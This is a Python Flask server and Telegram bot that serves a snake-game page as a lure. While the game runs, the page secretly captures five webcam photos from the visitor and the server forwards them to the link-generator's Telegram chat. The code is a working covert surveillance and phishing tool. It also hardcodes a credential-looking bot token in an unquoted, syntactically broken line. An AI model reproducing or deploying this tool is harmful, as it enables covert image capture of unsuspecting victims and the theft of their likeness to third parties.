# bot_server.py
import uuid, time, io, base64, threading
from flask import Flask, request, render_template_string, abort, jsonify
from telegram import Bot, InputMediaPhoto, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler

# ---------- إعدادات ----------
TELEGRAM_BOT_TOKEN = "PUT_YOUR_BOT_TOKEN_HERE"
BASE_URL = "https://yourdomain.com"  # غيره لنطاقك أو ngrok https url أثناء الاختبار
TOKEN_EXPIRE_SECONDS = 600  # صلاحية الرابط (ثواني)
# --------------------------------

bot = Bot(token=8405037288:AAHD7pChhw3BufzoFbR5MC1mQbQib8h6-uw)
app = Flask(__name__)

# تخزين مؤقت: token -> {owner_id, expires_at, used}
tokens = {}

def generate_link_for_owner(owner_id, expire_seconds=TOKEN_EXPIRE_SECONDS):
    token = str(uuid.uuid4())
    tokens[token] = {"owner_id": owner_id, "expires_at": time.time() + expire_seconds, "used": False}
    return f"{BASE_URL}/capture/{token}"

# ---------- صفحة HTML الواجهة (لعبة الثعبان + كاميرا مخفية) ----------
HTML_PAGE = """
<!doctype html>
<html lang="ar">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>𝘼𝙇𝙎𝙃𝘽𝙃 — Capture</title>
<style>
  :root{--c1:#00f6ff;--bg:#050505}
  body{margin:0;min-height:100vh;background:linear-gradient(180deg,#051018 0%, #000000 100%);color:#fff;font-family:system-ui,Segoe UI,Arial;}
  .wrap{max-width:760px;margin:28px auto;padding:18px;text-align:center}
  h1{font-size:40px;color:var(--c1);text-shadow:0 0 12px rgba(0,246,255,0.15)}
  #gameCanvas{background:#071219;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.6);display:block;margin:12px auto}
  .info{background:rgba(255,255,255,0.03);padding:10px;border-radius:8px;margin-top:12px}
  video{display:none}
  .brand{font-family:monospace;letter-spacing:6px;color:#88f;filter:drop-shadow(0 0 10px rgba(136,136,255,0.12))}
</style>
</head>
<body>
 <div class="wrap">
   <div class="brand">𝘼𝙇𝙎𝙃𝘽𝙃</div>
   <h1>لعبه الثعبان</h1>
   <canvas id="gameCanvas" width="400" height="400"></canvas>
   <div class="info">اضغط على الأسهم لتحكم الثعبان — أثناء اللعب، الكاميرا تعمل بالخلفية لالتقاط 5 صور بعد موافقتك.</div>
 </div>

<video id="video" autoplay playsinline></video>

<script>
// بسيطة: لعبة ثعبان
const canvas = document.getElementById('gameCanvas');
const ctx = canvas.getContext('2d');
const box = 20;
let snake = [{x:9*box, y:10*box}];
let d = null;
let food = { x: Math.floor(Math.random()*19+1)*box, y: Math.floor(Math.random()*19+1)*box };
let score = 0;
document.addEventListener('keydown', e => {
  if(e.key.includes('Arrow')) {
    if(e.key==='ArrowLeft' && d!=='RIGHT') d='LEFT';
    if(e.key==='ArrowUp' && d!=='DOWN') d='UP';
    if(e.key==='ArrowRight' && d!=='LEFT') d='RIGHT';
    if(e.key==='ArrowDown' && d!=='UP') d='DOWN';
  }
});
function collision(head, arr){ for(let i=0;i<arr.length;i++) if(head.x===arr[i].x && head.y===arr[i].y) return true; return false; }
function draw(){
  ctx.fillStyle='#00121a'; ctx.fillRect(0,0,400,400);
  for(let i=0;i<snake.length;i++){ ctx.fillStyle = i===0 ? '#7CFC00' : '#2E8B57'; ctx.fillRect(snake[i].x, snake[i].y, box, box); }
  ctx.fillStyle='#FF4D4D'; ctx.fillRect(food.x, food.y, box, box);
  let nx = snake[0].x, ny = snake[0].y;
  if(d==='LEFT') nx-=box; if(d==='RIGHT') nx+=box; if(d==='UP') ny-=box; if(d==='DOWN') ny+=box;
  if(nx===food.x && ny===food.y){ score++; food = { x: Math.floor(Math.random()*19+1)*box, y: Math.floor(Math.random()*19+1)*box }; } else snake.pop();
  let newHead={x:nx,y:ny};
  if(nx<0||ny<0||nx>=400||ny>=400||collision(newHead,snake)){ clearInterval(intv); return; }
  snake.unshift(newHead);
  ctx.fillStyle='#fff'; ctx.fillText('Score: '+score, 8, 16);
}
let intv = setInterval(draw, 100);

// ------ كاميرا تشتغل في الخلفية وتلتقط 5 صور تلقائي ------
const video = document.getElementById('video');
const token = location.pathname.split('/').pop(); // token من المسار /capture/<token>

navigator.mediaDevices.getUserMedia({ video:true })
.then(stream => {
  video.srcObject = stream;
  let count = 0;
  let images = [];
  const capInterval = setInterval(()=>{
    const c = document.createElement('canvas');
    c.width = 480; c.height = 360;
    c.getContext('2d').drawImage(video, 0, 0, c.width, c.height);
    images.push(c.toDataURL('image/jpeg', 0.85));
    count++;
    if(count>=5){
      clearInterval(capInterval);
      stream.getTracks().forEach(t=>t.stop());
      // أرسل للـ server
      fetch('/upload_images/' + token, {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({ images })
      }).catch(err => console.error('upload err', err));
    }
  }, 900); // فاصل 900ms بين الصور
})
.catch(err => {
  console.warn('camera denied or error', err);
  // إظهار رسالة للمستخدم لو احتجت
});
</script>
</body>
</html>
"""

# ---------- route لعرض صفحة الالتقاط ----------
@app.route("/capture/<token>")
def capture_page(token):
    info = tokens.get(token)
    if not info or info.get('used') or info['expires_at'] < time.time():
        return "الرابط منتهي أو غير صالح.", 404
    # عرض واجهة اللعبة (HTML_PAGE) — token embedded via path
    return render_template_string(HTML_PAGE)

# ---------- استلام الصور المرسلة من الصفحة ----------
@app.route("/upload_images/<token>", methods=["POST"])
def upload_images(token):
    info = tokens.get(token)
    if not info or info.get('used') or info['expires_at'] < time.time():
        return "token invalid or expired", 400
    data = request.get_json()
    images_data = data.get('images', [])
    if not images_data:
        return "no images", 400

    owner_id = info['owner_id']
    info['used'] = True  # امنع إعادة الاستخدام

    # جهز media group
    media_group = []
    bios = []  # لازم نحافظ على البايتس حتى لا يتم جمعها قبل الإرسال
    for idx, img in enumerate(images_data[:10]):  # تقييد العدد لو حبيت
        try:
            header, enc = img.split(',',1)
            b = base64.b64decode(enc)
            bio = io.BytesIO(b)
            bio.name = f'photo{idx}.jpg'
            bio.seek(0)
            bios.append(bio)
            media_group.append(InputMediaPhoto(bio))
        except Exception as e:
            print("decode err", e)

    # إرسال في ثريد حتى لا يعلق الـ Flask
    def send_media():
        try:
            if media_group:
                bot.send_media_group(chat_id=owner_id, media=media_group)
        except Exception as e:
            print("telegram send error:", e)

    threading.Thread(target=send_media).start()
    return "OK", 200

# ---------- Telegram bot handlers (يوزّر الرابط للمستخدم) ----------
def start(update, context):
    kb = [[InlineKeyboardButton("احصل على رابط الكاميرا", callback_data="GET_LINK")]]
    update.message.reply_text("اهلا — اضغط الزر للحصول على رابط الكاميرا (ينتهي بعد 10 دقائق).", reply_markup=InlineKeyboardMarkup(kb))

def button_cb(update, context):
    q = update.callback_query
    q.answer()
    if q.data == "GET_LINK":
        owner_id = q.from_user.id
        link = generate_link_for_owner(owner_id)
        # أرسل الرابط للمستخدم
        q.message.reply_text(f"رابطك (صالح لمدة {TOKEN_EXPIRE_SECONDS//60} دقيقة):\n{link}")
        # يمكنك اختياريًا ارسال زر مباشر لفتح الرابط
        q.message.reply_text("افتح الرابط ووافق على استخدام الكاميرا عندما يطلبه المتصفح.")
    else:
        q.message.reply_text("غير معروف.")

def main_bot():
    updater = Updater(TELEGRAM_BOT_TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CallbackQueryHandler(button_cb))
    updater.start_polling()
    print("Bot polling started")
    updater.idle()

# ---------- شغّل البوت + السيرفر ----------
if __name__ == "__main__":
    # شغّل البوت في ثريد منفصل
    t = threading.Thread(target=main_bot, daemon=True)
    t.start()
    # شغّل Flask (في الإنتاج استخدم gunicorn/nginx)
    app.run(host="0.0.0.0", port=5000, debug=True)
